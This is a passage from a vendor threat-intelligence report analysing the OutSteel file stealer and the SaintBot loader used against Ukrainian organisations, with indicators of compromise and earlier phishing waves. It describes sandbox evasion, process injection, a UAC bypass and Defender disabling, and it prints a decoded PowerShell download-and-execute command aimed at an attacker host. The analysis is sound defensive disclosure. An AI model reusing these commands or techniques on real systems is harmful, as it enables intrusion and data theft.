</tbody>
</table>
<p style="text-align: center;"><span style="color: #999999;"><sup>Table 2. File extensions gathered by OutSteel.</sup></span></p>
<p>The command output will be read by the AutoIT payload, and each file will be uploaded to the C2, using the <a href="https://github.com/jesobreira/HTTP.au3/blob/master/HTTP.au3">HTTP.au3</a> library.</p>
<p>Once the script has finished uploading all relevant files to the C2, it will then attempt to download a file to <span style="font-family: 'courier new', courier, monospace;">%TEMP%\svjhost.exe</span> from the secondary hardcoded C2 <span style="font-family: 'courier new', courier, monospace;">eumr[.]site</span>. The downloaded payload is a sample of the SaintBot .NET loader, also extracted from the SHCore2 DLL, and if downloaded successfully, will be executed via the command line.</p>
<figure id="attachment_122089" aria-describedby="caption-attachment-122089" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122089" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-31.png" alt="OutSteel downloads SaintBot and executes rmm.bat" width="900" height="191" /><figcaption id="caption-attachment-122089" class="wp-caption-text">Figure 8. OutSteel downloads SaintBot and executes rmm.bat</figcaption></figure>
<p>The script comes to a close after creating a <span style="font-family: 'courier new', courier, monospace;">.bat</span> file named <span style="font-family: 'courier new', courier, monospace;">rmm.bat</span> in the current directory, which will delete itself and the original payload, prior to terminating any running <span style="font-family: 'courier new', courier, monospace;">cmd.exe</span> processes.</p>
<figure id="attachment_122091" aria-describedby="caption-attachment-122091" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122091" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-32.png" alt="rmm.bat file contents." width="900" height="104" /><figcaption id="caption-attachment-122091" class="wp-caption-text">Figure 9. rmm.bat file contents.</figcaption></figure>
<p>At this point, the AutoIT script exits, leaving SaintBot residing in memory.</p>
<h4><a id="post-122070-_daq2aum6fzrd"></a>windows_defender_disable.bat</h4>
<p>This batch file is used to disable Windows Defender functionality. It accomplishes this by executing multiple commands via CMD that modify registry keys and disabling Windows Defender scheduled tasks. This script is open source and available on <a href="https://github.com/vs-toad/Windows/blob/master/windows_defender_disable.bat">GitHub</a>, so there is no custom element to this specific sample. This is done to reduce the risk of the dropped payloads being detected by Windows Defender.</p>
<figure id="attachment_122093" aria-describedby="caption-attachment-122093" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122093" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-33.png" alt="windows_defender_disable.bat script." width="900" height="490" /><figcaption id="caption-attachment-122093" class="wp-caption-text">Figure 10. windows_defender_disable.bat script.</figcaption></figure>
<h4><a id="post-122070-_rt4zqj9y4azn"></a>SaintBot .NET Loader</h4>
<p>The SaintBot .NET loader is also composed of several stages, with varying levels of obfuscation. It begins by executing a single PowerShell one-liner, which results in the execution of <span style="font-family: 'courier new', courier, monospace;">cmd.exe</span>, passing the command <span style="font-family: 'courier new', courier, monospace;">timeout 20</span>. Once the timeout completes, the loader will resume.</p>
<figure id="attachment_122095" aria-describedby="caption-attachment-122095" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122095" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-34.png" alt="Execution of PowerShell one-liner." width="900" height="272" /><figcaption id="caption-attachment-122095" class="wp-caption-text">Figure 11. Execution of PowerShell one-liner.</figcaption></figure>
<p>The first layer of the loader will extract a reversed .NET binary from its resources, before flipping, loading into memory and executing it.</p>
<figure id="attachment_122097" aria-describedby="caption-attachment-122097" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122097" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-35.png" alt="Reversed binary within resources." width="900" height="322" /><figcaption id="caption-attachment-122097" class="wp-caption-text">Figure 12. Reversed binary within resources.</figcaption></figure>
<p>This secondary layer contains far more obfuscation than the first, also implementing obfuscation through obscurity with around 140 different classes. Also stored within these classes are several virtual machine and sandbox checks, such as checking if <span style="font-family: 'courier new', courier, monospace;">Sbiedll.dll</span> is present in the list of loaded modules, comparing the machine name to <span style="font-family: 'courier new', courier, monospace;">HAL9TH</span> and the user name to <span style="font-family: 'courier new', courier, monospace;">JohnDoe</span>, and checking the BIOS version for known virtual machine identifiers.</p>
<figure id="attachment_122099" aria-describedby="caption-attachment-122099" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122099" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-36.png" alt="Anti-VM check." width="900" height="333" /><figcaption id="caption-attachment-122099" class="wp-caption-text">Figure 13. Anti-VM check.</figcaption></figure>
<p>The quickest way to bypass these checks is to simply set a breakpoint on the <span style="font-family: 'courier new', courier, monospace;">Invoke()</span> function and modify any values within memory to make sure no matches are discovered by the sample.</p>
<p>Once all checks have been passed, the second stage of the loader will extract the SaintBot binary from its resources and decrypt it. From there, it begins loading in different API calls, including <span style="font-family: 'courier new', courier, monospace;">VirtualAllocEx</span>, <span style="font-family: 'courier new', courier, monospace;">WriteProcessMemory</span>, <span style="font-family: 'courier new', courier, monospace;">CreateProcessA</span> and <span style="font-family: 'courier new', courier, monospace;">SetThreadContext</span>. These calls are used to spawn <span style="font-family: 'courier new', courier, monospace;">MSBuild.exe</span> in a suspended state before injecting the decrypted SaintBot binary into it, modifying the thread context to point to the malicious entry point and resuming the process.</p>
<figure id="attachment_122101" aria-describedby="caption-attachment-122101" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122101" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-37.png" alt="Loading process injection API." width="900" height="246" /><figcaption id="caption-attachment-122101" class="wp-caption-text">Figure 14. Loading process injection API.</figcaption></figure>
<h4><a id="post-122070-_1hm57pj6swb2"></a>SaintBot Payload</h4>
<p>SaintBot is a recently discovered malware loader, documented in April 2021 by <a href="https://blog.malwarebytes.com/threat-intelligence/2021/04/a-deep-dive-into-saint-bot-downloader/">MalwareBytes</a>. It contains capabilities to download further payloads as requested by threat actors, executing the payloads through several different means, such as injecting into a spawned process or loading into local memory. It can also update itself on disk – and remove any traces of its existence – as and when needed.</p>
<p>SHA-256: <span style="font-family: 'courier new', courier, monospace;">e8207e8c31a8613112223d126d4f12e7a5f8caf4acaaf40834302ce49f37cc9c</span></p>
<p>Upon execution within the MSBuild process, SaintBot will perform several anti-analysis checks, as well as a locale check. If any of these checks fail, a batch script named <span style="font-family: 'courier new', courier, monospace;">del.bat</span> is dropped to the <span style="font-family: 'courier new', courier, monospace;">%APPDATA%</span> folder and executed, removing any SaintBot payload-linked files from the system.</p>
<figure id="attachment_122103" aria-describedby="caption-attachment-122103" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122103" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-38.png" alt="System locale checks in the SaintBot downloader." width="900" height="233" /><figcaption id="caption-attachment-122103" class="wp-caption-text">Figure 15. System locale checks.</figcaption></figure>
<p>If the checks are passed, the payload attempts to locate <span style="font-family: 'courier new', courier, monospace;">slideshow.mp4</span> from the <span style="font-family: 'courier new', courier, monospace;">%LOCALAPPDATA%\zz%USERNAME%</span> path, where <span style="font-family: 'courier new', courier, monospace;">slideshow.mp4</span> is actually a copy of <span style="font-family: 'courier new', courier, monospace;">ntdll.dll</span>. If the file is not found, SaintBot assumes it has not yet been installed on the system and therefore jumps to the installation procedure. This involves creating a directory in the <span style="font-family: 'courier new', courier, monospace;">%LOCALAPPDATA%</span> folder, with the name set to <span style="font-family: 'courier new', courier, monospace;">zz%USERNAME%</span>. Then, the local <span style="font-family: 'courier new', courier, monospace;">ntdll.dll</span> binary is copied over to the newly created folder and renamed to <span style="font-family: 'courier new', courier, monospace;">slideshow.mp4</span>. Along with that, a <span style="font-family: 'courier new', courier, monospace;">.vbs</span> and <span style="font-family: 'courier new', courier, monospace;">.bat</span> script are dropped, named <span style="font-family: 'courier new', courier, monospace;">%USERNAME%</span>.vbs and <span style="font-family: 'courier new', courier, monospace;">%USERNAME%.bat</span>. Once the installation routine is complete, the payload executes itself once again and exits.</p>
<figure id="attachment_122105" aria-describedby="caption-attachment-122105" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122105" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-39.png" alt="Setting up core SaintBot folders." width="900" height="470" /><figcaption id="caption-attachment-122105" class="wp-caption-text">Figure 16. Setting up core SaintBot folders.</figcaption></figure>
<p>If <span style="font-family: 'courier new', courier, monospace;">slideshow.mp4</span> is discovered on the initial check, it is used to load in the core API provided by <span style="font-family: 'courier new', courier, monospace;">ntdll.dll</span>. This is done to avoid any hooks placed on API calls within the original <span style="font-family: 'courier new', courier, monospace;">ntdll.dll</span> by EDR/AV software.</p>
<figure id="attachment_122107" aria-describedby="caption-attachment-122107" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122107" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-40.png" alt="Resolving API through slideshow.mp4." width="900" height="300" /><figcaption id="caption-attachment-122107" class="wp-caption-text">Figure 17. Resolving API through slideshow.mp4.</figcaption></figure>
<p>At this point, the payload then checks to see if it is running under the process name <span style="font-family: 'courier new', courier, monospace;">dfrgui.exe</span>, and if not, it will spawn <span style="font-family: 'courier new', courier, monospace;">dfrgui.exe</span> from the <span style="font-family: 'courier new', courier, monospace;">%SYSTEM%</span> directory. This spawned process is then injected into <span style="font-family: 'courier new', courier, monospace;">dfrgui.exe</span> using <span style="font-family: 'courier new', courier, monospace;">NtQueueApcThread</span> to resume the process, and the original MSBuild process terminates.</p>
<figure id="attachment_122109" aria-describedby="caption-attachment-122109" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122109" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-41.png" alt="" width="900" height="255" /><figcaption id="caption-attachment-122109" class="wp-caption-text">Figure 18. Injection into dfrgui.exe</figcaption></figure>
<p>If SaintBot is running inside <span style="font-family: 'courier new', courier, monospace;">dfrgui.exe</span>, it will confirm whether or not it is running with administrator privileges. If not, it will attempt to bypass UAC using <span style="font-family: 'courier new', courier, monospace;"><a href="https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692">fodhelper.exe</a></span>.</p>
<figure id="attachment_122111" aria-describedby="caption-attachment-122111" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122111" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-42.png" alt="Privilege escalation via fodhelper.exe" width="900" height="520" /><figcaption id="caption-attachment-122111" class="wp-caption-text">Figure 19. Privilege escalation via fodhelper.exe</figcaption></figure>
<p>Persistence is then set up through the <span style="font-family: 'courier new', courier, monospace;">CurrentVersion\Run</span> registry key, and communication finally begins with the C2 server. This sample has a total of three C2 servers embedded within it, all reaching out to the same <span style="font-family: 'courier new', courier, monospace;">/wp-adm/gate.php</span> endpoint.</p>
<figure id="attachment_122113" aria-describedby="caption-attachment-122113" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122113" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-43.png" alt="Hardcoded C2s." width="900" height="494" /><figcaption id="caption-attachment-122113" class="wp-caption-text">Figure 20. Hardcoded C2s.</figcaption></figure>
<p>This particular sample accepts six total commands from the C2 server:</p>
<table style="width: 99.78%;">
<tbody>
<tr>
<td style="width: 18.8474%;"><b>Command</b></td>
<td style="width: 197.975%;"><b>Purpose</b></td>
</tr>
<tr>
<td style="width: 18.8474%;"><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">de</span></p>
<p><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">de:regsvr32</span></td>
<td style="width: 197.975%;"><span style="font-weight: 400;">Execute an EXE or DLL (using regsvr32) via </span><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">cmd.exe</span></td>
</tr>

<h1><a id="conclusion"></a>Conclusion</h1>
<p>Unit 42 research discovered a threat group targeting an energy organization that is part of Ukraine’s critical infrastructure. This attack is part of a year-long campaign of attacks that not only targeted Ukrainian government organizations, but also foreign nations’ embassies in Ukraine. The threat group delivered a malicious payload called OutSteel that is capable of automatically exfiltrating various types of files, including documents, archives, database files and files containing email-related data. Based on the list of targeted organizations and the use of a file exfiltration tool, we believe this threat group’s primary goal is to steal sensitive information for the purpose of situational awareness and leverage in dealing with Ukraine.</p>
<p>For Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:</p>
<p><a href="https://www.paloaltonetworks.com/cortex/cortex-xdr">Cortex XDR</a> protects endpoints from the SaintBot malware described in this blog.</p>
<p><a href="https://www.paloaltonetworks.com/products/secure-the-network/wildfire">WildFire</a> cloud-based threat analysis service accurately identifies the malware described in this blog as malicious.</p>
<p><a href="https://www.paloaltonetworks.com/network-security/advanced-url-filtering">Advanced URL Filtering</a> and <a href="https://www.paloaltonetworks.com/network-security/dns-security">DNS Security</a> identify domains associated with this attack campaign as malicious.</p>
<p>Users of the <a href="https://www.paloaltonetworks.com/cortex/autofocus">AutoFocus</a> contextual threat intelligence service can view malware associated with these attacks using the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.SaintBot">SaintBot</a>, <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.SaintBot_Loader">SaintBot_Loader</a> and <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.OutSteel">OutSteel</a> tags.</p>
<p>Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the <a href="https://www.cyberthreatalliance.org/">Cyber Threat Alliance</a>.</p>

<h1><a id="indicators-of-compromise"></a>Indicators of Compromise</h1>
<h2><a id="post-122070-_3modil4qg9qz"></a>Delivery Hashes</h2>
<p><span style="font-family: 'courier new', courier, monospace;">07ed980373c344fd37d7bdf294636dff796523721c883d48bb518b2e98774f2c</span><br />
<span style="font-family: 'courier new', courier, monospace;">0be1801a6c5ca473e2563b6b77e76167d88828e1347db4215b7a83e161dae67f</span><br />
<span style="font-family: 'courier new', courier, monospace;">0db336cab2ca69d630d6b7676e5eab86252673b1197b34cf4e3351807229f12a</span><br />

<h2><a id="appendix-a-prior-attacks-associated-with-uac-0056"></a>Appendix A: Prior Attacks Associated With UAC-0056</h2>
<p>Prior attacks associated with UAC-0056 are described below, organized by the time of attack. For an overview of known attacks, please see the timeline in the “<a href="#links-to-prior-attacks">Links to Prior Attacks</a>” section above.</p>
<h3><a id="march-2021-attacks"></a>March 2021 Attacks</h3>
<p>According to <a href="https://blog.malwarebytes.com/threat-intelligence/2021/04/a-deep-dive-into-saint-bot-downloader/">MalwareBytes research</a>, this threat group carried out an attack campaign in March 2021 on targets in Georgia using Bitcoin and COVID themes. The researchers state that these attacks involve spear phishing, but we do not have telemetry to confirm the targeted organizations, attack vector or the exact dates in which the attacks took place. The Bitcoin-themed attacks are very similar to those seen in later April attacks, as the PDF delivery documents had similar content that references Electrum bitcoin wallets, as seen in Figure 21.</p>
<figure id="attachment_122117" aria-describedby="caption-attachment-122117" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122117" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-45.png" alt="Contents of PDF documents used in Bitcoin-themed attacks in April 2021." width="900" height="702" /><figcaption id="caption-attachment-122117" class="wp-caption-text">Figure 21a. Contents of PDF documents used in Bitcoin-themed attacks in March 2021.</figcaption></figure>
<figure id="attachment_122115" aria-describedby="caption-attachment-122115" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122115" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-44.png" alt="Contents of PDF documents used in Bitcoin-themed attacks in April 2021." width="900" height="530" /><figcaption id="caption-attachment-122115" class="wp-caption-text">Figure 21b. Contents of PDF documents used in Bitcoin-themed attacks in March 2021.</figcaption></figure>
<p>The COVID-themed attacks reference a government organization in Georgia, which suggests that the threat group has interests in other countries in the region in addition to Ukraine. The attack involved a Zip archive hosted at ​​<span style="font-family: 'courier new', courier, monospace;">bgicovid19[.]com/assets/img/newCOVID-21.zip</span> and contains the two malicious files and one decoy document, as listed in Table 4.</p>

<tr>
<td style="width: 25.788%;"><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">New Folder.lnk</span></td>
<td style="width: 39.0401%;"><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">5d8c5bb9858fb51271d344eac586cff3f440c074254f165c23dd87b985b2110b</span></td>
<td style="width: 35.3152%;"><span style="font-weight: 400;">LNK Shortcut that downloads </span><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">baiden00[.]ru/wininst.exe</span></td>
</tr>
<tr>
<td style="width: 25.788%;"><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">letter from the Ministry of Labour, Health and Social Affairs of Georgia.pdf</span></td>
<td style="width: 39.0401%;"><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">49a758bfe34f1769a27b1a2da9f914bc956f7fdbb9e7a33534ca9e19d5f6168c</span></td>
<td style="width: 35.3152%;"><span style="font-weight: 400;">Decoy document</span></td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="color: #999999;"><sup>Table 4. Delivery documents used in March attack.</sup></span></p>
<p>The <span style="font-family: 'courier new', courier, monospace;">letter from the Ministry of Labour, Health and Social Affairs of Georgia.pdf</span> document is a decoy, as it contains no malicious content. The decoy content does show a document from the Ministry of Labour, Health and Social Affairs of Georgia, as seen in Figure 22, which suggests that the target may have involved an organization in Georgia.</p>
<figure id="attachment_122119" aria-describedby="caption-attachment-122119" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122119" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-46.png" alt="Decoy document’s contents in suspected March 2021 attacks." width="900" height="440" /><figcaption id="caption-attachment-122119" class="wp-caption-text">Figure 22. Decoy document’s contents in suspected March 2021 attacks.</figcaption></figure>
<h3><a id="april-2021-attacks"></a>April 2021 Attacks</h3>
<p>In April 2021, the threat group carried out an attack that involved a spear phishing email with a PDF document attached, which suggested the recipient could become rich by accepting Bitcoins, as seen in Figure 23. As first seen in research by <a href="https://asec.ahnlab.com/en/22481/">Ahnlab</a>, these Bitcoin-themed attacks were specifically targeting Ukrainian government organizations.</p>
<figure id="attachment_122121" aria-describedby="caption-attachment-122121" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122121" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-47.png" alt="Contents of PDF documents used in Bitcoin-themed attacks." width="900" height="526" /><figcaption id="caption-attachment-122121" class="wp-caption-text">Figure 23. Contents of PDF documents used in Bitcoin-themed attacks.</figcaption></figure>
<p>The PDF document attached to the delivery email contains text that suggests the individual can access a Bitcoin wallet with a large sum of money along with a link to download the wallet, as seen in Figure 24. The link <span style="font-family: 'courier new', courier, monospace;">cutt[.]ly/McXG1ft</span> is shortened and points to the URL <span style="font-family: 'courier new', courier, monospace;">http://1924[.]site/doc/bitcoin.zip</span> to download a Zip archive.</p>
<figure id="attachment_122123" aria-describedby="caption-attachment-122123" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122123" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-48.png" alt="Contents of PDF documents used in Bitcoin-themed attacks." width="900" height="577" /><figcaption id="caption-attachment-122123" class="wp-caption-text">Figure 24. Contents of PDF documents used in Bitcoin-themed attacks.</figcaption></figure>
<p>The Zip archive contains a LNK shortcut that runs a powershell script to download and execute a payload from <span style="font-family: 'courier new', courier, monospace;">hxxp://1924[.]site/soft/09042021.exe</span>. The archive also contains a <span style="font-family: 'courier new', courier, monospace;">password.txt</span> file that has the following contents, which involve an Electrum Bitcoin wallet that links back to the attacks against Ukraine on Feb. 1, 2022:</p>
<p><span style="font-family: 'courier new', courier, monospace;">Wallet in folder.<br />
</span><span style="font-family: 'courier new', courier, monospace;">Electrum: https://electrum.org<br />
</span><span style="font-family: 'courier new', courier, monospace;">Password for walletr is: btc1000000000usd</span></p>
<p>According to <a href="https://www.fortinet.com/blog/threat-research/spearphishing-attack-uses-covid-21-lure-to-target-ukrainian-government">Fortinet</a> research, in April 2021, this threat group also carried out COVID-themed attacks on Ukrainian government organizations. The email seen in Figure 25 includes a fake forwarded message meant to appear as correspondence between a government official and the World Health Organization (WHO). The email contains a link to a Zip archive hosted on the legitimate who.int domain. However, the link points to a shortened link of <span style="font-family: 'courier new', courier, monospace;">hxxps://cutt[.]ly/LcHx2Ga</span> instead.</p>
<figure id="attachment_122125" aria-describedby="caption-attachment-122125" style="width: 635px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122125" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-49.png" alt="Delivery email in COVID-themed attacks." width="635" height="698" /><figcaption id="caption-attachment-122125" class="wp-caption-text">Figure 25. Delivery email in COVID-themed attacks.</figcaption></figure>
<p>The <span style="font-family: 'courier new', courier, monospace;">hxxps://cutt[.]ly/LcHx2Ga</span> URL points to <span style="font-family: 'courier new', courier, monospace;">hxxp://2330[.]site/NewCovid-21.zip</span>, which hosted a Zip archive (SHA256: <span style="font-family: 'courier new', courier, monospace;">677500881c64f4789025f46f3d0e853c00f2f41216eb2f2aaa1a6c59884b04cc</span>) that contained the following files:</p>
<p><span style="font-family: 'courier new', courier, monospace;">COVID-21.doc</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">9803e65afa5b8eef0b6f7ced42ebd15f979889b791b8eadfc98e7f102853451a</span>)</p>
<p><span style="font-family: 'courier new', courier, monospace;">COVID-21.lnk</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">2b15ade9de6fb993149f27c802bb5bc95ad3fc1ca5f2e86622a044cf3541a70d</span>)</p>
<p><span style="font-family: 'courier new', courier, monospace;">GEO-CFUND-2009_CCM Agreement_Facesheet - signed.pdf</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">bbab12dc486b1c6fcf9e343ec1474d0f8967de988444d7f838f1b4dcab343e8a</span>)</p>
<p><span style="font-family: 'courier new', courier, monospace;">New Folder.lnk</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">2b15ade9de6fb993149f27c802bb5bc95ad3fc1ca5f2e86622a044cf3541a70d</span>)</p>
<p>The LNK shortcuts attempt to run a PowerShell script that will download an executable from the following URL, save it to <span style="font-family: 'courier new', courier, monospace;">%TEMP%\WindowsUpdate.exe</span> and execute it:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxp://2330[.]site/soft/08042021.exe</span></p>
<p>The LNK shortcut downloads the executable from the URL above using the <span style="font-family: 'courier new', courier, monospace;">Start-BitsTransfer</span> cmdlet, which is the same technique the threat group used to download the payload within the macro in the July 2021 attacks discussed below.</p>
<h3><a id="may-2021-attacks"></a>May 2021 Attacks</h3>
<p>In May 2021, we saw the threat group sending targeted emails sent to two Ukrainian government organizations. The two emails had subjects of <span style="font-family: 'courier new', courier, monospace;">Заява №4872823</span> and <span style="font-family: 'courier new', courier, monospace;">Заява №487223/2</span>, and both had the same message content that suggested the email was from a senior investigator trying to contact the individual, as seen in Figure 26. The use of law enforcement related themes across May and June 2021, as well as in February 2022, suggests that the threat group favors this social engineering theme in the absence of a trending topic or current event.</p>
<figure id="attachment_122127" aria-describedby="caption-attachment-122127" style="width: 795px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122127" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-50.png" alt="Spear phishing email sent to Ukrainian government organizations in May 2021." width="795" height="269" /><figcaption id="caption-attachment-122127" class="wp-caption-text">Figure 26. Spear phishing email sent to Ukrainian government organizations in May 2021.</figcaption></figure>
<p>Both of the delivery emails had the same attachment, specifically <span style="font-family: 'courier new', courier, monospace;">Заява №4872823-(20).cpl</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">f4a56c86e2903d509ede20609182fbe001b3a3ca05f8c23c597189935d4f71b8</span>), which is a Windows Control Panel File that acts as an initial downloader to download and execute a payload from:</p>
<p><span style="font-family: 'courier new', courier, monospace;">32689657[.]xyz/putty5482.exe</span></p>
<p>The Control Panel File saves the downloaded executable to <span style="font-family: 'courier new', courier, monospace;">%PUBLIC%\puttys.exe</span> and runs it using the <span style="font-family: 'courier new', courier, monospace;">WinExec</span> function. The resulting executable (SHA256: <span style="font-family: 'courier new', courier, monospace;">df3b1ad5445d628c24c1308aa6cb476bd9a06f0095a2b285927964339866b2c3</span>) eventually runs the OutSteel document stealer, which will exfiltrate files to the following URL:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxp://194[.]147.142.232/upld/</span></p>
<h3><a id="june-2021-attacks"></a>June 2021 Attacks</h3>
<p>In June 2021, we observed this threat group targeting another Ukrainian government organization by sending a spear phishing email with a subject that translates to “Your arrest warrant” from Ukrainian. The content of this email, seen in Figure 27, includes urgent language suggesting that the recipient must read the attached report or they will be declared “wanted.” This law enforcement theme relates to the Feb. 1, 2022, attacks that used a supposed police report as part of social engineering.</p>
<figure id="attachment_122129" aria-describedby="caption-attachment-122129" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122129" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-51.png" alt="Spear phishing email sent to Ukrainian government organization in June 2021." width="900" height="587" /><figcaption id="caption-attachment-122129" class="wp-caption-text">Figure 27. Spear phishing email sent to Ukrainian government organization in June 2021.</figcaption></figure>
<p>The attachment is not a report as the body of the email suggests. Rather, the <span style="font-family: 'courier new', courier, monospace;">Заява №487223-31.doc (880m5) .js</span> file attached is a JavaScript file that is 1,029,786 bytes in size (the actors added a considerable amount of spaces between each character of the JavaScript code). If the recipient opens the attachment, the following JavaScript will execute:</p>
<figure id="attachment_122131" aria-describedby="caption-attachment-122131" style="width: 900px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-122131" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2022/02/word-image-1.jpeg" alt="Malicious JavaScript contained in attached file." width="900" height="176" /><figcaption id="caption-attachment-122131" class="wp-caption-text">Figure 28. Malicious JavaScript contained in attached file.</figcaption></figure>
<p>The JavaScript above will run an encoded PowerShell script that decodes to the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">invOKe-WeBREqUEST -urI hxxp://150520212[.]space/000.cpl -oUtFILE $ENv:PuBLiC\000.cpl; &amp; $eNV:PUBlIc\000.cpl</span></p>
<p>This PowerShell script will download and execute a Control Panel File (CPL) from <span style="font-family: 'courier new', courier, monospace;">150520212[.]space</span>, which it saves to a file named <span style="font-family: 'courier new', courier, monospace;">000.cpl</span> (SHA256: <span style="font-family: 'courier new', courier, monospace;">b72188ba545ad865eb34954afbbdf2c9e8ebc465a87c5122cebb711f41005939</span>). The <span style="font-family: 'courier new', courier, monospace;">000.cpl</span> is a DLL whose functional code exists within the exported function <span style="font-family: 'courier new', courier, monospace;">CPlApplet</span>. The functional code uses several consecutive jumps in an attempt to make code analysis more difficult. Despite these jumps, the functional code starts with a decryption stub, which will XOR each QWORD in the ciphertext using a key that starts as <span style="font-family: 'courier new', courier, monospace;">0x29050D91</span>. However, in each iteration of the decryption loop, the key is modified by multiplying it by <span style="font-family: 'courier new', courier, monospace;">0x749507B5</span> and adding <span style="font-family: 'courier new', courier, monospace;">0x29050D91</span>.</p>
<p>Once the decryption stub has finished, the code jumps to the decrypted code, which is a shellcode-based downloader that carries out the following activity:</p>
<p>1. Loads <span style="font-family: 'courier new', courier, monospace;">kernel32</span> using <span style="font-family: 'courier new', courier, monospace;">LoadLibraryW<br />
</span>2. Gets the address to <span style="font-family: 'courier new', courier, monospace;">ExpandEnvironmentStringsW</span> using <span style="font-family: 'courier new', courier, monospace;">GetProcAddress<br />
</span>3. Calls <span style="font-family: 'courier new', courier, monospace;">ExpandEnvironmentStringsA</span> to expand the environment string for the path <span style="font-family: 'courier new', courier, monospace;">%PUBLIC%\5653YQ5T3.exe<br />
</span>4. Opens the <span style="font-family: 'courier new', courier, monospace;">%PUBLIC%\5653YQ5T3.exe</span> file using <span style="font-family: 'courier new', courier, monospace;">CreateFileW<br />
</span>5. Loads <span style="font-family: 'courier new', courier, monospace;">WinHttp</span> using <span style="font-family: 'courier new', courier, monospace;">LoadLibraryA<br />
</span>6. Opens an HTTP session by calling <span style="font-family: 'courier new', courier, monospace;">WinHttpOpen<br />
</span>7. Connects to remote server <span style="font-family: 'courier new', courier, monospace;">150520212[.]space</span> over port 80/TCP by calling <span style="font-family: 'courier new', courier, monospace;">WinHttpConnect<br />
</span>8. Creates an HTTP GET request for <span style="font-family: 'courier new', courier, monospace;">/0404.exe</span> using <span style="font-family: 'courier new', courier, monospace;">WinHttpOpenRequest<br />
</span>9. Sends the request via <span style="font-family: 'courier new', courier, monospace;">WinHttpSendRequest<br />
</span>10. Calls <span style="font-family: 'courier new', courier, monospace;">WinHttpReceiveResponse</span>, <span style="font-family: 'courier new', courier, monospace;">WinHttpQueryDataAvailable</span> and <span style="font-family: 'courier new', courier, monospace;">WinHttpReadData</span> to get the HTTP response data<br />
11. Writes the response data to <span style="font-family: 'courier new', courier, monospace;">%PUBLIC%\5653YQ5T3.exe</span> by calling <span style="font-family: 'courier new', courier, monospace;">WriteFile<br />
</span>12. Closes handle to <span style="font-family: 'courier new', courier, monospace;">%PUBLIC%\5653YQ5T3.exe</span> by calling <span style="font-family: 'courier new', courier, monospace;">CloseHandle<br />
</span>13. Runs <span style="font-family: 'courier new', courier, monospace;">%PUBLIC%\5653YQ5T3.exe</span> by calling <span style="font-family: 'courier new', courier, monospace;">ShellExecuteW<br />
